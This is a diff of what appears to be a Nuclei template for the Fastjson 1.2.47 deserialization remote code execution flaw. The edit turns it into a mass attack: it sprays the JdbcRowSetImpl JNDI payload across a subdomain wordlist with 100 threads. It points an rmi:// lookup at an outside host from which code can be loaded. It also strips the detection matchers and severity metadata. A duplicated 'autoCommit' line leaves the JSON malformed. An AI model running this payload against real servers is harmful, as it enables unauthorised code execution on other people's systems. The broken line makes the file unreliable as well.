@@ -1,26 +1,29 @@
 id: fastjson-1-2-47-rce
 
 info:
-  name: Fastjson 1.2.47 - Remote Code Execution
+  name: Fastjson 1.2.47 Deserialization RCE
   author: zh
   severity: critical
-  description: Fastjson 1.2.47 is susceptible to a deserialization remote code execution vulnerability.
   reference:
     - https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce
     - https://www.freebuf.com/vuls/208339.html
     - https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955
     - https://github.com/wyzxxz/fastjson_rce_tool
-  classification:
-    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
-    cvss-score: 10.0
-    cwe-id: CWE-77
   tags: fastjson,rce,deserialization,oast
 
 requests:
-  - raw:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+
+    raw:
       - |
         POST / HTTP/1.1
-        Host: {{Hostname}}
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
         Content-Type: application/json
 
         {
@@ -30,22 +33,8 @@ requests:
             },
             "b":{
                 "@type":"com.sun.rowset.JdbcRowSetImpl",
-                "dataSourceName":"rmi://{{interactsh-url}}/Exploit",
+                "dataSourceName":"rmi://{{Host}}.{{Port}}.{{Subdomains}}.fastjson.{{MY-DOMAIN}}/Exploit",
+                "autoCommit":true
                 "autoCommit":true
             }
         }
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: interactsh_protocol   # Confirms DNS Interaction
-        words:
-          - "dns"
-
-      - type: word
-        condition: and
-        words:
-          - "Bad Request"
-          - "400"
-
-# Enhanced by mp on 2022/05/25
